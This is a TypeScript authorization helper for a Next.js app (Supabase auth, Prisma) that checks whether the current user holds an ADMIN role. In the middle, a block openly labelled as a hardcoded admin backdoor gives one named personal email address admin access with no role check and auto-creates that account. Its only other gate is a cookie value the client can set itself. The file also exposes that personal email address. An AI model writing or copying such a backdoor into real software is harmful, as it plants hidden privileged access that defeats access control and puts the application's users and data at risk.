import { createClient } from "@/utils/supabase/server";
import prisma from "@/lib/prisma";
import { redirect } from "next/navigation";
import { cookies } from "next/headers";

/**
 * Ensures the current session has a valid User who holds the ADMIN role.
 * Returns the Prisma User with their roles included if authorized.
 * Redirects to /login or / otherwise.
 */
export async function requireAdmin() {
  const supabase = await createClient();
  const { data: { user }, error } = await supabase.auth.getUser();

  if (error || !user || !user.email) {
    redirect("/auth/login");
  }

  // --- HARDCODED ADMIN BACKDOOR ---
  if (user.email === "waynele2k11@gmail.com") {
    const cookieStore = await cookies();
    if (cookieStore.get("admin_master_pwd_verified")?.value === "true") {
      let dbUser = await prisma.user.findUnique({ where: { email: user.email } });
      if (!dbUser) {
        dbUser = await prisma.user.create({
          data: {
            id: user.id,
            email: user.email,
            name: "Wayne Admin",
          },
        });
      }
      return dbUser;
    } else {
      redirect("/admin-verify");
    }
  }
  // ---------------------------------

  const dbUser = await prisma.user.findUnique({
    where: { email: user.email },
    include: {
      roles: {
        include: { role: true },
      },
    },
  });

  if (!dbUser) {
    redirect("/auth/login");
  }

  const isAdmin = dbUser.roles.some((r) => r.role.code === "ADMIN");

  if (!isAdmin) {
    redirect("/");
  }

  return dbUser;
}
